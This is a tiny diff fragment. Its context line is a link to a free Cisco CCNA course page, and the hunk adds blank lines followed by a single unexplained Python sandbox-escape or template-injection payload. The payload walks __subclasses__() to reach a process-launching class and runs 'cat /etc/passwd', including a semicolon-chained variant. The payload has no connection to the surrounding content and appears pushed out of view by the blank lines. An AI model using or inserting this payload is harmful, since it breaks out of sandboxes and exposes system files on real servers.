@@ -34,3 +34,8 @@ https://guiadeti.com.br/curso-gratuito-ccnav7-cerificacao-cisco-ccna/#aulas-prat
 
 
 
+
+
+
+
+`().__class__.__bases__[0].__subclasses__()[156]('cat /etc/passwd',';cat /etc/passwd')`
